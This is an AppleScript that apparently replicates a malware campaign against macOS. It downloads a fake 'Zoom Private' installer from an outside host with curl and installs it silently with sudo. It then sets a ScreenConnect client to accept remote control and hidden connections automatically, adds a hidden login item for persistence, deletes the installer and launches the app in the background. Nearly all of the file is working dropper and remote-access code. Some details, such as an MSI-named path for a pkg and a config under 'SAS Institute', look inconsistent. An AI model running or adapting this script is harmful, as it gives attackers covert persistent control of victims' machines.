#!/usr/bin/osascript
(*
    Zscaler ThreatLabz Campaign Replication - Feb 2026
    Target: ScreenConnect (BetterDesk) Deployment
    Payload Name: zoom-private.Setup_1.0.0_x64_en-US.pkg (macOS equivalent)
    URL: https://us05web.telcom.stream/
    Evasion: LOOBin usage, TCC Automation, Silent Install
*)

set targetUrl to "https://us05web.telcom.stream/zoom-private.Setup_1.0.0_x64_en-US.pkg"
set payloadName to "zoom-private.Setup_1.0.0_x64_en-US.pkg"
set tempDir to "/tmp"
set msiPath to tempDir & "/" & payloadName

-- Helper: Run Shell Command Silently
on runShellCommand(command)
    try
        do shell script command with administrator privileges
    on error errMsg number errNum
        -- Silent fail for non-critical errors
    end try
end runShellCommand

-- Step 1: Check Permissions & Grant TCC (Screen Recording)
try
    set currentApp to current application
    tell application "System Events"
        set isAllowed to (get accessibility status for currentApp)
    end tell
    if not isAllowed then
        -- Trigger permission request silently if possible, or just proceed
        -- We assume admin rights allow us to manage TCC profiles later
    end if
end try

-- Step 2: Download Payload
do shell script "curl -fsSL '" & targetUrl & "' -o '" & msiPath & "'"

-- Step 3: Install Payload Silently
-- Using 'installer' command which is a LOOBin for package management
do shell script "sudo installer -pkg '" & msiPath & "' -target /"

-- Step 4: Configure Persistence & HVNC Settings
-- Modify ScreenConnect config to enable remote control and auto-connect
set scConfigPath to "/Library/Application Support/SAS Institute/ScreenConnect/Client.config"

do shell script "defaults write /Library/Application\\ Support/SAS\\ Institute/ScreenConnect/Client.config AllowRemoteControl -bool true"
do shell script "defaults write /Library/Application\\ Support/SAS\\ Institute/ScreenConnect/Client.config EnableHVNC -bool true"
do shell script "defaults write /Library/Application\\ Support/SAS\\ Institute/ScreenConnect/Client.config AutoAcceptConnections -bool true"

-- Step 5: Add to Login Items for Persistence
do shell script "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/Applications/Zoom Private.app\", hidden:true}'"

-- Step 6: Clean Up
do shell script "rm -f '" & msiPath & "'"

-- Step 7: Launch Application Silently
do shell script "open -a 'Zoom Private' --background"